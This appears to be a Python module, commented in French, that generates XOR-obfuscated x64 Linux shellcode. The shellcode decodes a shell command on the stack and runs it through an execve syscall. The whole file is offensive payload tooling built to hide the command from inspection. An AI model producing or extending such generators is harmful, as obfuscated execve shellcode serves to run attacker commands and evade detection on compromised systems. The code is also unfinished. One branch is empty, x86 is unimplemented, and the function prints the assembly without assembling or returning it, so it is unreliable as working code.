from keystone import *
import struct
from .utils import sanitize_command
from .parseUserInput import *
def encode_string(s: str, xor_key: int = 0x00) -> tuple[list[int], int]:
    """
    Encode une chaîne en valeurs numériques XORées.
    Retourne les valeurs encodées et la longueur.
    """
    # Padding à 8 bytes
    padded = s.encode() + b'\x00' * (8 - (len(s) % 8))
    length = len(s)
    
    # XOR chaque byte
    encoded = [b ^ xor_key for b in padded]
    
    # Convertir en valeurs 64-bits
    values = []
    for i in range(0, len(encoded), 8):
        chunk = encoded[i:i+8]
        value = int.from_bytes(bytes(chunk), 'little')
        values.append(value)
    
    return values, length





def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key: int = 0x00) -> bytes:
    """
    Génère un shellcode à partir d'une commande shell.
    
    Args:
        command: La commande à exécuter
        arch: Architecture cible ('x86' ou 'x64')
        xor_key: Clé XOR pour l'obfuscation
    
    Returns:
        bytes: Le shellcode généré
    """
    # Set up la generation du shellcode
    # Encode la commande avec la clé XOR


    accumulatedSize = 0
    # list2return -> [(int: coef, list: encoded_values), (int: coef, list: encoded_values), ...]
    listArguments = setupToShellcode(parsedCommandList, xor_key)
    print("[+] Liste des arguments : ", listArguments)
    totalSize = 0
    for i in listArguments:
        totalSize += i[0]
    print("[+] Taille totale : ", totalSize)
    if arch == 'x64':
        if xor_key == 0x00:
            pass
        else:

            print(f"[+] Coef padding pour la cmd: {listArguments[0][0]}")
            # Début du shellcode
            asm = """
            bits 64
            
            initshellcode:
                xor rax, rax
                push rax            ; NULL terminator envp
            """
            



            #Routine pour les arguments ici par exemple /bin/bash -c 'ls -la' correspond a execve("/bin/bash", ["/bin/bash", "-c", "ls -la"], NULL)
            #On va donc avoir 3 arguments : "/bin/bash", "-c", "ls -la"
            #On va donc avoir 3 valeurs encodées
            #On va donc avoir 3 push rdi
            #On va donc avoir 3 mov rdi, {hex(value)}
            #On va donc avoir 3 push rdi
            



             #Ajoute les valeurs encodées
            for value in reversed(listArguments[0][1]):
                print(f"[+] Value: {value}")
                asm += f"""
                mov rdi, {hex(value)}   ; Partie encodée de la commande
                push rdi
                """
            asm += """
                ;mov rdi, rsp        ; rdi = ptr vers la commande encodée
                """

            # ajouter les arguments ici
            for i in range(1, len(listArguments)):
                for value in reversed(listArguments[i][1]):
                    print("[+] On passe au arguments apres la cmd")
                    print(f"[+] Value: {value}")
                    asm += f"""
                mov rsi, {hex(value)}   ; Partie encodée de la commande
                push rsi
                    """
            
            asm += """
                mov rdi, rsp
                """

            asm += f"""
                xor rax, rax        ; compteur pour le décodage
                jmp xorshellcode
                
            shellcodeExecution:
                xor rax, rax
                push rax            ; NULL
                mov rdx, rsp        ; rdx = envp
                add rdi, {8*(totalSize - listArguments[0][0])}
                """
            
            for i in range(len(listArguments)-1, 0, -1):
                accumulatedSize += listArguments[i][0]
            print(f"[+] accumulatedSize: {accumulatedSize}")
            for i in range(len(listArguments)-1, 0, -1):
                asm += f"""
                lea rsi, [rdi - {8*accumulatedSize}]
                push rsi
                """
                accumulatedSize -= listArguments[i][0]

            asm += f"""
                push rdi            ; ptr vers la commande
                mov rsi, rsp        ; rsi = argv [commande, NULL]
                mov al, 59          ; execve
                syscall
                
            xorshellcode:
                xor byte [rdi+rax], """
            
            asm += hex(xor_key)     # Ajoute la clé XOR
            
            asm += """
                inc rax
                cmp rax, """
            
            asm += str(totalSize*8)      # Ajoute la longueur de la commande
            
            asm += """
                jl xorshellcode
                jmp shellcodeExecution
            """
            
            print("ASM:")
            print(asm)

    elif arch == 'x86':
        raise NotImplementedError("x86 is not supported for the moment")
